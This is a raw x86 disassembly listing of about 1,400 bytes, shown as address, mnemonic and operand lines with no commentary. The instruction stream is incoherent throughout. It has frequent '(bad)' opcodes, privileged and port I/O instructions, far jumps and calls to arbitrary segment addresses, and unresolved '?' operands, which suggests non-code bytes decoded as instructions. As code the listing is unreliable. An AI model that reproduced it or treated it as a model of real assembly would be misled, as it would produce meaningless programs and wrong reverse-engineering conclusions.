  4234b9:	sbb    ebp,0xffffffc8
  4234bc:	sub    BYTE PTR [ebp+0x4820250b],0xfa
  4234c3:	xor    eax,0xb1c9f491
  4234c8:	sbb    DWORD PTR [ecx+0x12b190b7],eax
  4234ce:	inc    esp
  4234cf:	and    al,0x90
  4234d1:	mov    edi,0x7777cf91
  4234d6:	inc    ecx
  4234d7:	mov    bl,0xd
  4234d9:	xchg   DWORD PTR [edx+0x18],ebp
  4234dc:	(bad)  
  4234de:	gs fwait
  4234e0:	bnd jge 0x4234d5
  4234e3:	push   ds
  4234e4:	fs stc 
  4234e6:	pop    ss
  4234e7:	push   ecx
  4234e8:	inc    edi
  4234e9:	retf   
  4234ea:	mov    DWORD PTR [edx+0x79],edx
  4234ed:	hlt    
  4234ee:	sar    DWORD PTR [edi+0x28bf571b],cl
  4234f4:	adc    ch,bl
  4234f6:	xor    cl,BYTE PTR [edi+0x42]
  4234f9:	(bad)  
  4234fa:	and    eax,0xa3d62eab
  4234ff:	mov    dl,0x99
  423501:	fild   QWORD PTR [esp+ebp*8-0x4802bfff]
  423508:	rcr    DWORD PTR [ebp-0x2aca893d],cl
  42350e:	inc    ebp
  42350f:	push   eax
  423510:	clc    
  423511:	(bad)  
  423512:	das    
  423513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423514:	and    BYTE PTR [esi],dh
  423516:	(bad)  
  423518:	push   edx
  423519:	inc    esi
  42351a:	outs   dx,DWORD PTR ds:[esi]
  42351b:	lock sub al,BYTE PTR [eax+eax*4-0x23c685cb]
  423523:	mov    bl,0x61
  423525:	fidivr DWORD PTR [eax+0x14]
  423528:	push   esi
  423529:	lea    edi,[esi+0x3fd81ab8]
  42352f:	retf   
  423530:	push   es
  423531:	fimul  WORD PTR [esi+ebp*4]
  423534:	out    0x9f,al
  423536:	mov    BYTE PTR [ebp+0x41],ch
  423539:	sbb    edx,DWORD PTR [edx+0x30]
  42353c:	retf   
  42353d:	pop    es
  42353e:	test   eax,0xcb20d332
  423543:	imul   eax,DWORD PTR [ecx+ebp*1],0xd4a291d7
  42354a:	mov    edx,0x78d8510f
  42354f:	jae    0x423587
  423551:	cmp    eax,0xefe97aee
  423556:	hlt    
  423557:	pop    edi
  423558:	sub    DWORD PTR [edx+edx*8],esi
  42355b:	jnp    0x42355b
  42355d:	out    0x76,eax
  42355f:	push   cs
  423560:	imul   ah
  423562:	cdq    
  423563:	add    ch,dh
  423565:	xor    dl,BYTE PTR [ebx+0x3f34ebcb]
  42356b:	(bad)  
  42356c:	jnp    0x42356b
  42356e:	or     ebx,DWORD PTR [eax]
  423570:	mov    bl,0xc7
  423572:	inc    esp
  423573:	inc    esp
  423574:	adc    ah,bl
  423576:	add    BYTE PTR [edi+0x76],bh
  423579:	jb     0x4235d2
  42357b:	mov    ds:0x19a2ca6c,al
  423580:	xchg   ecx,eax
  423581:	das    
  423582:	lods   al,BYTE PTR ds:[esi]
  423583:	int3   
  423584:	sbb    DWORD PTR [ebx],ecx
  423586:	fild   QWORD PTR [edx-0x35]
  423589:	and    al,0xbd
  42358b:	fisttp QWORD PTR [ecx]
  42358d:	cli    
  42358e:	call   0xe13cf807
  423593:	(bad)  
  423594:	sbb    al,0x72
  423596:	mov    bl,0xe1
  423598:	xor    DWORD PTR [eax],edx
  42359a:	lds    ebx,FWORD PTR [edi]
  42359c:	data16 cmc 
  42359e:	jne    0x123867d8
  4235a4:	mov    ds:0xeb6733fd,al
  4235a9:	or     eax,0xeda2bf80
  4235ae:	cmp    dh,BYTE PTR [edi-0x12336618]
  4235b4:	cmp    eax,0xac7c4ba5
  4235b9:	mov    cl,0xb7
  4235bb:	add    ebp,edx
  4235bd:	popa   
  4235be:	or     al,0x5d
  4235c0:	(bad)  
  4235c1:	pop    eax
  4235c2:	out    dx,al
  4235c3:	jmp    0x6e8d:0x8537d40
  4235ca:	mov    bl,ah
  4235cc:	in     eax,0xc6
  4235ce:	ins    DWORD PTR es:[edi],dx
  4235cf:	sbb    BYTE PTR [ebx+0x56],dl
  4235d2:	addr16 hlt 
  4235d4:	das    
  4235d5:	mov    bh,0xa6
  4235d7:	dec    esp
  4235d8:	in     al,dx
  4235d9:	shl    BYTE PTR [edx-0x60],cl
  4235dc:	(bad)  
  4235dd:	cld    
  4235de:	int    0x59
  4235e0:	sti    
  4235e1:	in     al,0x1f
  4235e3:	sub    al,0x55
  4235e5:	or     eax,0xf86df318
  4235ea:	inc    esi
  4235eb:	jge    0x4235d0
  4235ed:	mov    ah,0xd7
  4235ef:	ins    BYTE PTR es:[edi],dx
  4235f0:	mov    DWORD PTR [ebp-0x2e],0xdcf2f877
  4235f7:	div    ebp
  4235f9:	pop    eax
  4235fa:	mov    esi,edx
  4235fc:	jmp    0xa130:0x250f927a
  423603:	in     al,0x29
  423605:	and    BYTE PTR [ebp-0xe60673],ah
  42360b:	mov    BYTE PTR [edi+eiz*8+0x45a7c050],al
  423612:	push   edi
  423613:	adc    esi,DWORD PTR [edx+0x57cc4074]
  423619:	nop
  42361a:	ss push ds
  42361c:	lea    edx,[eax+0x1b6112cb]
  423622:	mov    cl,0xef
  423624:	int    0xff
  423626:	and    al,0x6d
  423628:	ja     0x4235d3
  42362a:	xchg   esp,eax
  42362b:	jl     0x4235cc
  42362d:	push   ebx
  42362e:	push   ecx
  42362f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423630:	mov    dl,0xb
  423632:	mov    ebx,0x8c7b0462
  423637:	jge    0x4235e0
  423639:	shr    BYTE PTR [edx+0x5d],cl
  42363c:	outs   dx,DWORD PTR ds:[esi]
  42363d:	sub    eax,0xa9e7e5e9
  423642:	(bad)  
  423643:	fist   WORD PTR [eax-0x28dcffae]
  423649:	dec    edx
  42364a:	adc    edx,DWORD PTR [edx*8-0x2a7c26e3]
  423651:	inc    esp
  423652:	sub    DWORD PTR [edx],0x36
  423655:	and    dh,BYTE PTR [ebx-0x6476047f]
  42365b:	xchg   esi,eax
  42365c:	xchg   edi,eax
  42365d:	mov    ebp,0xb9e0e895
  423662:	jae    0x42365e
  423664:	dec    esp
  423665:	into   
  423666:	dec    ebp
  423667:	xor    DWORD PTR ds:0xb3173684,eax
  42366d:	mov    edi,0xe0670ae1
  423672:	jmp    0x771a8120
  423677:	loope  0x423674
  423679:	xchg   esi,eax
  42367a:	idiv   dl
  42367c:	test   al,0x20
  42367e:	pop    esp
  42367f:	push   eax
  423680:	jmp    0x423639
  423682:	hlt    
  423683:	xchg   edi,eax
  423684:	clc    
  423685:	add    BYTE PTR [eax],al
  423687:	add    BYTE PTR [eax],al
  423689:	add    BYTE PTR [eax+0x59],bl
  42368c:	dec    ebx
  42368d:	push   ebp
  42368e:	dec    ebx
  42368f:	push   edi
  423690:	pop    esi
  423691:	pop    ebp
  423692:	mov    ebx,0x36a42923
  423697:	(bad)  
  423698:	mov    bh,0x50
  42369a:	icebp  
  42369b:	les    eax,FWORD PTR [ecx]
  42369d:	add    BYTE PTR [ebx-0x3cfffffa],al
  4236a3:	mov    eax,ds:0xc66dc762
  4236a8:	jmp    0x173c7099
  4236ad:	add    ecx,DWORD PTR [esi-0x53]
  4236b0:	or     al,0xeb
  4236b2:	int    0x19
  4236b4:	mov    ch,0x9c
  4236b6:	shr    DWORD PTR [edx],cl
  4236b8:	dec    ecx
  4236b9:	lock cld 
  4236bb:	sub    al,0xb7
  4236bd:	pusha  
  4236be:	sbb    al,0x39
  4236c0:	jne    0x4236e4
  4236c2:	sbb    al,0x98
  4236c4:	repz sub eax,0x4b07b700
  4236ca:	inc    esp
  4236cb:	and    ebp,DWORD PTR [edx-0x46a314c6]
  4236d1:	(bad)  
  4236d2:	jmp    0x423674
  4236d4:	neg    bh
  4236d6:	jns    0x423704
  4236d8:	pop    edx
  4236d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236da:	add    bh,BYTE PTR [eax-0x73]
  4236dd:	call   0x233a:0x61b03970
  4236e4:	sbb    DWORD PTR [edi+0x41],0x1f
  4236e8:	sub    bl,dh
  4236ea:	push   0xffffffe6
  4236ec:	jo     0x4236d5
  4236ee:	test   BYTE PTR ds:0xb6c3dca1,cl
  4236f4:	mov    dh,0x54
  4236f6:	cwde   
  4236f7:	sub    al,0x56
  4236f9:	dec    esi
  4236fa:	retf   0x11d4
  4236fd:	add    dl,BYTE PTR [ebp+0x54]
  423700:	cmc    
  423701:	mov    al,0x7
  423703:	shl    DWORD PTR [ecx-0x564f43a8],1
  423709:	jo     0x423707
  42370b:	mov    gs,edi
  42370d:	data16 lods al,BYTE PTR ds:[esi]
  42370f:	aam    0xbd
  423711:	add    al,0x9e
  423713:	jge    0x42371b
  423715:	hlt    
  423716:	mov    ch,0x1d
  423718:	lahf   
  423719:	mov    WORD PTR [eax],?
  42371b:	mov    ah,0x7a
  42371d:	or     DWORD PTR [ebp-0x2a],edi
  423720:	push   cs
  423721:	add    BYTE PTR [ebp-0x73c5b351],dh
  423727:	test   al,0xd3
  423729:	jge    0x4236c6
  42372b:	xchg   edx,eax
  42372c:	mov    dl,BYTE PTR [esi]
  42372e:	test   al,0x99
  423730:	sbb    eax,0x98115278
  423735:	pushf  
  423736:	outs   dx,BYTE PTR ds:[esi]
  423737:	das    
  423738:	ins    BYTE PTR es:[edi],dx
  423739:	mov    ecx,0xea2a3bf2
  42373e:	mov    esp,0xcadb7377
  423743:	fisttp WORD PTR [esi+0x58]
  423746:	xchg   ecx,eax
  423747:	les    ecx,FWORD PTR [eax-0x443dafbd]
  42374d:	les    edx,FWORD PTR [esi+edx*1-0x56]
  423751:	fild   QWORD PTR [ebx]
  423753:	inc    ebp
  423754:	test   bl,cl
  423756:	xor    ecx,DWORD PTR [ecx+0x66]
  423759:	ss enter 0x956,0x84
  42375e:	jne    0x4236e3
  423760:	cli    
  423761:	mov    dh,0xa6
  423763:	call   0xd900b6a0
  423768:	pop    edi
  423769:	mov    bl,0xe1
  42376b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42376c:	cwde   
  42376d:	in     al,dx
  42376e:	pop    ds
  42376f:	sbb    eax,DWORD PTR [edx+0x4aa1995d]
  423775:	sbb    dh,BYTE PTR fs:[ebp-0x59152bf3]
  42377c:	and    eax,0x8c075d8b
  423781:	and    DWORD PTR [ebp-0x27],edx
  423784:	(bad)  
  423785:	out    0xc8,al
  423787:	push   es
  423788:	stos   BYTE PTR es:[edi],al
  423789:	sub    bl,BYTE PTR [esi]
  42378b:	push   ebp
  42378c:	dec    esp
  42378d:	jecxz  0x42377e
  42378f:	inc    ecx
  423790:	pop    ds
  423791:	in     eax,0x1f
  423793:	mov    ds:0x3add6402,al
  423798:	mov    eax,ds:0xa7e17404
  42379d:	add    BYTE PTR cs:[esi],bh
  4237a0:	sub    eax,0x2cd106c9
  4237a5:	aad    0xbf
  4237a7:	out    dx,eax
  4237a8:	cwde   
  4237a9:	xor    DWORD PTR [ebx],ecx
  4237ab:	adc    dh,BYTE PTR [ecx-0x4e]
  4237ae:	add    eax,0x1779cfe
  4237b3:	mov    edx,0xacd0d1
  4237b8:	sbb    al,0x24
  4237ba:	sbb    BYTE PTR [ebx+0x0],0x23
  4237be:	pop    esi
  4237bf:	or     eax,0xe252eef7
  4237c4:	and    DWORD PTR [ecx-0x63f77102],0xa863cd2b
  4237ce:	stc    
  4237cf:	xor    al,0xb9
  4237d1:	ins    DWORD PTR es:[edi],dx
  4237d2:	data16 xor BYTE PTR [edx],bl
  4237d5:	out    0x72,eax
  4237d7:	data16 mov al,0x3b
  4237da:	sahf   
  4237db:	dec    ebx
  4237dc:	enter  0xef7b,0x5f
  4237e0:	psllw  mm6,QWORD PTR [ecx+0x6d]
  4237e4:	inc    edx
  4237e5:	dec    edx
  4237e6:	fwait
  4237e7:	sti    
  4237e8:	outs   dx,DWORD PTR ds:[esi]
  4237e9:	mov    gs,WORD PTR [ebx+0xc]
  4237ec:	clc    
  4237ed:	shl    DWORD PTR [edx+ebx*4-0x57],cl
  4237f1:	pop    es
  4237f2:	(bad)  
  4237f3:	stos   DWORD PTR es:[edi],eax
  4237f4:	inc    ebx
  4237f5:	lahf   
  4237f6:	adc    DWORD PTR [edi],0x3
  4237f9:	sahf   
  4237fa:	leave  
  4237fb:	mov    esp,0x6388a999
  423800:	xor    ah,BYTE PTR [edi+0x27]
  423803:	fiadd  DWORD PTR [esp+esi*8+0x4034d7e3]
  42380a:	dec    eax
  42380b:	popf   
  42380c:	xlat   BYTE PTR ds:[ebx]
  42380d:	or     al,0x6d
  42380f:	push   ecx
  423810:	push   edx
  423811:	cmp    al,dl
  423813:	aam    0x6b
  423815:	scas   eax,DWORD PTR es:[edi]
  423816:	int    0x9b
  423818:	jge    0x42385c
  42381a:	mov    al,0x17
  42381c:	adc    al,0x2b
  42381e:	fld    TBYTE PTR [ecx]
  423820:	sbb    al,0x46
  423822:	sbb    DWORD PTR [edx],0xffffffdd
  423825:	jp     0x4237b6
  423827:	pop    esp
  423828:	cli    
  423829:	cwde   
  42382a:	(bad)  
  42382b:	imul   ecx,ebp,0x53f1fd
  423831:	repnz fisubr WORD PTR [ebx-0x11]
  423835:	das    
  423836:	sahf   
  423837:	push   ss
  423838:	adc    cl,BYTE PTR [esi]
  42383a:	outs   dx,BYTE PTR ds:[esi]
  42383b:	adc    al,0xdd
  42383d:	fucom  st(3)
  42383f:	jl     0x4237d8
  423841:	int    0x65
  423843:	mov    al,0xd4
  423845:	scas   eax,DWORD PTR es:[edi]
  423846:	jae    0x4237d2
  423848:	push   ds
  423849:	in     eax,dx
  42384a:	shl    BYTE PTR [esp+ebp*8-0x25],1
  42384e:	cwde   
  42384f:	mov    esi,0x6e2e6197
  423854:	stc    
  423855:	mov    ds:0xecae5563,al
  42385a:	jecxz  0x423855
  42385c:	push   cs
  42385d:	adc    ebp,DWORD PTR [esi-0x1a3efda]
  423863:	xchg   esp,eax
  423864:	and    DWORD PTR [ebx-0x64ab97f0],esi
  42386a:	mov    al,0x5d
  42386c:	mov    esp,0xbb1224d5
  423871:	mov    eax,0xb794dcb2
  423876:	rcr    DWORD PTR [esi],cl
  423878:	pop    esi
  423879:	scas   eax,DWORD PTR es:[edi]
  42387a:	xchg   DWORD PTR [edx],edx
  42387c:	fcom   DWORD PTR [ebx]
  42387e:	ins    DWORD PTR es:[edi],dx
  42387f:	push   ebx
  423880:	sahf   
  423881:	(bad)  
  423882:	in     eax,dx
  423883:	jno    0x4238b7
  423885:	and    ecx,DWORD PTR [eax]
  423887:	mov    ebx,0x66660a41
  42388c:	inc    edx
  42388d:	xchg   BYTE PTR [ecx+0x63],bl
  423890:	test   eax,0xa520bde9
  423895:	xor    eax,0x29ad6343
  42389a:	jo     0x423890
  42389c:	cld    
  42389d:	pop    ebx
  42389e:	mov    ss:0x75487be5,al
  4238a4:	mov    bh,0xf8
  4238a6:	repnz mov esi,0x7fffb404
  4238ac:	mov    al,0x1c
  4238ae:	xchg   ecx,eax
  4238af:	div    BYTE PTR [eiz*1+0x30d2ad50]
  4238b6:	add    ah,BYTE PTR [ebx]
  4238b8:	out    dx,al
  4238b9:	jo     0x423913
  4238bb:	sub    eax,0xf5216d23
  4238c0:	and    eax,0x3d2fb46c
  4238c5:	packuswb mm3,mm6
  4238c8:	(bad)  
  4238ca:	fwait
  4238cb:	aaa    
  4238cc:	mov    dl,0x25
  4238ce:	push   0x3d
  4238d0:	adc    eax,0xe7f98359
  4238d5:	sti    
  4238d6:	lahf   
  4238d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238d8:	sbb    BYTE PTR [eax+0x11bbcff4],al
  4238de:	sbb    ebp,DWORD PTR [edx+0x3f18f501]
  4238e4:	push   esp
  4238e5:	and    al,0x16
  4238e7:	jae    0x42391f
  4238e9:	gs call 0xb08e:0xcabedd69
  4238f1:	pushf  
  4238f2:	jl     0x423916
  4238f4:	sbb    eax,DWORD PTR [ecx]
  4238f6:	addr16 xchg ebp,eax
  4238f8:	inc    esp
  4238f9:	mov    cl,0x3b
  4238fb:	repz xchg esp,eax
  4238fd:	cmp    ebp,ebx
  4238ff:	and    DWORD PTR [eax],0x4676f097
  423905:	lock les ecx,FWORD PTR [edx+0x48]
  423909:	into   
  42390a:	add    cl,cl
  42390c:	cmp    eax,edx
  42390e:	sbb    eax,0x1ae8a3e0
  423913:	ror    DWORD PTR [esi-0xe3a8390],cl
  423919:	jno    0x423991
  42391b:	or     bl,BYTE PTR [edi-0x6e]
  42391e:	stos   DWORD PTR es:[edi],eax
  42391f:	sti    
  423920:	pop    eax
  423921:	test   eax,0xe1c3010
  423926:	sub    DWORD PTR [eax+0x5d],ebp
  423929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42392a:	or     DWORD PTR [esi-0x6c523711],esi
  423930:	dec    edx
  423931:	cmp    esp,esi
  423933:	inc    ebx
  423934:	in     al,dx
  423935:	jge    0x42395b
  423937:	aas    
  423938:	xchg   ebp,eax
  423939:	pop    ebp
  42393a:	xor    eax,0x3f00f410
  42393f:	jne    0x423917
  423941:	mov    ch,0x88
  423943:	fwait
  423944:	adc    DWORD PTR [eax],ebx
  423946:	das    
  423947:	adc    DWORD PTR [ebx+edi*4+0x38],ecx
  42394b:	aaa    
  42394c:	aam    0xe9
  42394e:	lods   eax,DWORD PTR ds:[esi]
  42394f:	inc    edx
  423950:	jl     0x4238e6
  423952:	xchg   esi,eax
  423953:	cmp    BYTE PTR [esi],ch
  423955:	mov    ds:0x65c01fb3,al
  42395a:	int3   
  42395b:	push   ebx
  42395c:	xor    edi,DWORD PTR [ebx-0x3a]
  42395f:	sbb    DWORD PTR [ebp+0x60],ecx
  423962:	sbb    DWORD PTR [eax-0x69],0xffffffac
  423966:	(bad)  
  423968:	adc    al,0x58
  42396a:	pusha  
  42396b:	mov    eax,ds:0xb08048a7
  423970:	jl     0x4239f0
  423972:	dec    edx
  423973:	jl     0x4239a6
  423975:	mov    ebp,0xf0de3bac
  42397a:	pop    esp
  42397b:	fwait
  42397c:	daa    
  42397d:	imul   ecx,DWORD PTR [edi],0x3c03861d
  423983:	mov    bl,0x51
  423985:	mov    bh,0x19
  423987:	xor    esp,DWORD PTR [ecx-0x21aad3ea]
  42398d:	sub    eax,DWORD PTR [edi]
  42398f:	pop    eax
  423990:	mov    cl,0xa4
  423992:	mov    ch,0xaf
  423994:	sub    dh,al
  423996:	xchg   ah,bl
  423998:	int3   
  423999:	cwde   
  42399a:	test   BYTE PTR [ebx+0x8726056],cl
  4239a0:	in     eax,dx
  4239a1:	lea    esp,[eax]
  4239a3:	ret    0xbbde
  4239a6:	jp     0x42393a
  4239a8:	(bad)  
  4239a9:	mov    ebp,0xe77ef461
  4239ae:	jge    0x423a2e
  4239b0:	sub    al,0xef
  4239b3:	pop    ss
  4239b4:	jmp    0x47a8b32b
  4239b9:	push   dx
  4239bb:	lods   al,BYTE PTR ds:[esi]
  4239bc:	imul   ecx,edi,0xdc89e316
  4239c2:	jo     0x4239cf
  4239c4:	addr16 push 0x71
  4239c7:	mov    edi,DWORD PTR [eax]
  4239c9:	ret    0x76c6
  4239cc:	adc    DWORD PTR [ebp+ecx*8-0x522ef018],edx
  4239d3:	sub    al,0xa6
  4239d5:	loope  0x423a14
  4239d7:	sbb    ebx,DWORD PTR [ebp-0x4e]
  4239da:	mov    edi,0xcc073e91
  4239df:	rol    DWORD PTR [edx],0x93
  4239e2:	call   0x469c:0x149fb193
  4239e9:	cmp    edi,ebx
  4239eb:	ds push ecx
  4239ed:	jmp    0xbd7a4e2e
  4239f2:	push   es
  4239f3:	out    0xa6,eax
  4239f5:	lods   eax,DWORD PTR ds:[esi]
  4239f6:	xchg   ecx,ecx
  4239f8:	mov    eax,0x4583e3b
  4239fd:	pop    edi
  4239fe:	push   ebp
  4239ff:	jge    0x4239df
  423a01:	jp     0x423987
  423a03:	fisubr DWORD PTR [edx]
  423a05:	jle    0x423995
  423a07:	push   ebx
  423a08:	push   ds
  423a09:	int    0xe3
  423a0b:	js     0x4239cd
  423a0d:	out    dx,al
  423a0e:	sbb    DWORD PTR [eax],ecx
  423a10:	pop    edx
  423a11:	popa   
  423a12:	pop    ecx
  423a13:	cmc    
  423a14:	stos   DWORD PTR es:[edi],eax
  423a15:	inc    eax
  423a16:	push   ds
  423a17:	sub    al,0xd5
  423a19:	jmp    0x2eb9:0x4232209
  423a20:	rol    BYTE PTR [ebx+0x78],0x6e
  423a24:	inc    ebp
  423a25:	(bad)  [edi+0x51]
  423a28:	loope  0x423a1c
  423a2a:	ss aam 0xf8
  423a2d:	aam    0x69
  423a2f:	sahf   
  423a30:	cdq    
  423a31:	cli    
  423a32:	jns    0x4239f7
  423a34:	dec    ebx
  423a35:	mov    al,0x35
  423a37:	mov    esi,0x6ce30620
  423a3c:	jmp    0xace1:0xc0908631
  423a43:	bound  ebp,QWORD PTR [ecx-0x61]
  423a46:	(bad)
  423a49:	outs   dx,BYTE PTR ds:[esi]
  423a4a:	test   DWORD PTR [ebp-0x4a],0x2db985ef
  423a51:	sti    
  423a52:	out    0xf2,eax
  423a54:	popa   
  423a55:	ror    edx,cl
  423a57:	pop    edi
  423a58:	mov    ecx,0xab0e1a6c
  423a5d:	in     eax,0x10
  423a5f:	or     DWORD PTR [ebx],ebx
  423a61:	push   esi
  423a62:	push   ecx
  423a63:	sti    
  423a64:	repnz inc DWORD PTR [ebp-0x1e]
  423a68:	repz loopne 0x423a10
  423a6b:	in     al,dx
  423a6c:	fwait
  423a6d:	jg     0x423a3f
  423a6f:	leave  
  423a70:	adc    eax,0x32003087
  423a75:	stos   BYTE PTR es:[edi],al
  423a76:	fxch   st(1)
  423a78:	adc    BYTE PTR [eax],dh
  423a7a:	scas   eax,DWORD PTR es:[edi]
  423a7b:	imul   ebx,DWORD PTR [edx+0x23984c9a],0xf042e183
  423a85:	sbb    edx,ebx
  423a87:	xchg   DWORD PTR [ebx+edx*8],ecx
  423a8a:	jno    0x423ad2
  423a8c:	lahf   
  423a8d:	mov    ss,WORD PTR [edi]
  423a8f:	(bad)  
  423a90:	lods   eax,DWORD PTR ds:[esi]
  423a91:	or     dh,bh
  423a93:	outs   dx,BYTE PTR ds:[esi]
  423a94:	mov    BYTE PTR [edi-0x1eab88a3],ch
  423a9a:	add    al,0xc9
  423a9c:	push   ebp
  423a9d:	aaa    
  423a9e:	pop    eax
  423a9f:	out    0x92,eax
  423aa1:	imul   edx,DWORD PTR [edi+0xd],0x86422b91
  423aa8:	ins    DWORD PTR es:[edi],dx
  423aa9:	stc    
  423aaa:	fcomp  QWORD PTR [edi]
  423aac:	(bad)  
  423aad:	push   eax
  423aae:	test   eax,0x8e3c1634
  423ab3:	sar    DWORD PTR [eax+0x19ff4a2],0x82
  423aba:	push   es
  423abb:	neg    al
  423abd:	jle    0x423aa6
  423abf:	sbb    eax,0x2ecd4c3d
  423ac4:	mov    dh,0xa0
  423ac6:	dec    edi
  423ac7:	xor    DWORD PTR [ebx+0x766a848a],0xffffffbc
  423ace:	out    dx,al
  423acf:	leave  
  423ad0:	outs   dx,DWORD PTR ds:[esi]
  423ad1:	mov    esi,0xd5879bf2
  423ad6:	sub    BYTE PTR [esi-0x80],ch
  423ad9:	out    dx,al
  423ada:	hlt    
  423adb:	jne    0x423a8d
  423add:	mov    ds:0x6b7f82c8,al
  423ae2:	dec    edx
  423ae3:	out    dx,eax
  423ae4:	popf   
  423ae5:	mov    gs,WORD PTR [edx]
  423ae7:	sahf   
  423ae8:	xlat   BYTE PTR ds:[ebx]
  423ae9:	mov    ds:0x7d2e8d06,al
  423aee:	pop    ebx
  423aef:	ror    edx,cl
  423af1:	fcomp  DWORD PTR es:[ecx-0x6d]
  423af5:	sbb    esi,esp
  423af7:	stc    
  423af8:	repnz pop edx
  423afa:	int    0xf6
  423afc:	bound  ecx,QWORD PTR [bx+0x6b8e]
  423b01:	sbb    esi,DWORD PTR [eax]
  423b03:	scas   eax,DWORD PTR es:[edi]
  423b04:	cli    
  423b05:	out    dx,eax
  423b06:	(bad)  [ebx-0xb]
  423b09:	add    eax,0x6120b664
  423b0e:	cwde   
  423b0f:	pop    eax
  423b10:	int    0x5d
  423b12:	or     esp,DWORD PTR [esi]
  423b14:	pop    esi
  423b15:	fs je  0x423b5f
  423b18:	pushf  
  423b19:	nop
  423b1a:	ret    
  423b1b:	in     eax,0x15
  423b1d:	jo     0x423b75
  423b1f:	popa   
  423b20:	aaa    
  423b21:	and    eax,0x725bc7aa
  423b26:	jmp    0xe0b20688
  423b2b:	ja     0x423b12
  423b2d:	pop    es
  423b2e:	pop    ss
  423b2f:	mov    edi,esi
  423b31:	fwait
  423b32:	mov    ah,0x71
  423b34:	mov    ch,0x99
  423b36:	mov    edi,esi
  423b38:	hlt    
  423b39:	xchg   ebx,eax
  423b3a:	mov    al,ds:0x8901853d
  423b3f:	mov    bl,BYTE PTR es:[eax+0x75]
  423b43:	mov    WORD PTR [esi],ds
  423b45:	fdivr  st(1),st
  423b47:	adc    dh,BYTE PTR [ebp-0x64456f84]
  423b4d:	cmp    ecx,DWORD PTR [esi]
  423b4f:	adc    DWORD PTR [ecx+0x1b4a7f40],ecx
  423b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b56:	lds    esp,FWORD PTR fs:[edx+0x4a7c571]
  423b5d:	xchg   bl,ch
  423b5f:	aaa    
  423b60:	lods   eax,DWORD PTR ds:[esi]
  423b61:	and    eax,0x33bbeb33
  423b66:	fwait
  423b67:	scas   eax,DWORD PTR es:[edi]
  423b68:	mov    esi,0xfad18693
  423b6d:	push   es
  423b6e:	mov    ebx,0x724fb46d
  423b73:	ja     0x423b84
  423b75:	aam    0xca
  423b77:	push   edi
  423b78:	and    DWORD PTR [eax-0x38c80fa9],ebx
  423b7e:	cmp    eax,0xcbeb1cab
  423b83:	and    BYTE PTR [ecx+0x30],bh
  423b86:	in     al,dx
  423b87:	or     DWORD PTR [edx-0x4fd11d29],ebp
  423b8d:	div    ecx
  423b8f:	xor    ch,BYTE PTR [di-0x51]
  423b93:	(bad)  
  423b94:	push   eax
  423b95:	or     eax,0x4b97118e
  423b9a:	sbb    DWORD PTR [esi],esi
  423b9c:	gs mov eax,eax
  423b9f:	sbb    eax,0x86c10897
  423ba4:	test   eax,0xba0c9f54
  423ba9:	iret   
  423baa:	sbb    BYTE PTR [edx],ah
  423bac:	mov    cl,0x49
  423bae:	js     0x423bb9
  423bb0:	dec    edx
  423bb1:	aam    0x31
  423bb3:	jno    0x423b88
  423bb5:	push   edi
  423bb6:	dec    esi
  423bb7:	sub    eax,0x12b65341
  423bbc:	stos   BYTE PTR es:[edi],al
  423bbd:	in     al,0x28
  423bbf:	je     0x423bb9
  423bc1:	ds push es
  423bc3:	sti    
  423bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bc5:	mov    ds:0xa6f5c65b,eax
  423bca:	imul   esi,DWORD PTR [ecx-0x20],0xe6e308ae
  423bd1:	inc    eax
  423bd2:	xor    eax,0x7bc949ce
  423bd7:	shl    DWORD PTR [ebp-0x10],1
  423bda:	out    dx,eax
  423bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bdc:	scas   al,BYTE PTR es:[edi]
  423bdd:	jl     0x423c33
  423bdf:	imul   esi,DWORD PTR ds:0x9772c771,0x3d74ef4
  423be9:	lock (bad) 
  423beb:	pop    ecx
  423bec:	stos   DWORD PTR es:[edi],eax
  423bed:	add    dh,bh
  423bef:	mov    cs,WORD PTR [eax]
  423bf1:	xchg   ax,ax
  423bf3:	add    ah,BYTE PTR [ecx+0x56]
  423bf6:	push   0x53
  423bf8:	mov    ds,WORD PTR [ebx+edi*8]
  423bfb:	xor    eax,0xd7a73e8a
  423c00:	pop    edx
  423c01:	js     0x423b8c
  423c03:	popa   
  423c04:	inc    ebp
  423c05:	inc    ebp
  423c06:	imul   ebp,DWORD PTR [eax-0x5fd11341],0x10604fde
  423c10:	out    dx,eax
  423c11:	jne    0x423c06
  423c13:	adc    BYTE PTR [edx-0x27fe674b],ah
  423c19:	xor    al,0x8d
  423c1b:	jp     0x423c76
  423c1d:	in     al,dx
  423c1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c1f:	loop   0x423ba5
  423c21:	(bad)  
  423c22:	stc    
  423c23:	test   eax,0x8e69e432
  423c28:	dec    ecx
  423c29:	inc    esp
  423c2a:	ror    DWORD PTR [ebx],0xd
  423c2d:	pusha  
  423c2e:	push   edi
  423c2f:	sub    al,0xde
  423c31:	mov    ?,WORD PTR [edi]
  423c33:	mov    esi,0x6e7245de
  423c38:	adc    BYTE PTR [edi+0x71f057ab],cl
  423c3e:	adc    esi,DWORD PTR [ebx+eax*1-0x3aa1bdfe]
  423c45:	nop
  423c46:	mov    ds:0x6c745ab3,eax
  423c4b:	fisub  WORD PTR [esi+0x40d7a934]
  423c51:	ror    ah,1
  423c53:	jno    0x423c9a
  423c55:	clc    
  423c56:	sub    BYTE PTR [ecx+0x37],al
  423c59:	test   al,0xb0
  423c5b:	aaa    
  423c5c:	in     al,0x55
  423c5e:	cmc    
  423c5f:	push   edi
  423c60:	out    0x7e,eax
  423c62:	enter  0x2e2e,0xb
  423c66:	dec    ebx
  423c67:	add    al,BYTE PTR [ecx]
  423c69:	jbe    0x423c2a
  423c6b:	push   eax
  423c6c:	out    dx,eax
  423c6d:	data16 jae 0x423cd5
  423c70:	je     0x423bfe
  423c72:	cdq    
  423c73:	xchg   edi,eax
  423c74:	imul   eax,esi,0xffffff9d
  423c77:	dec    esi
  423c78:	mov    esi,0x9c16b321
  423c7d:	push   cs
  423c7e:	xchg   esp,eax
  423c7f:	(bad)  [ecx]
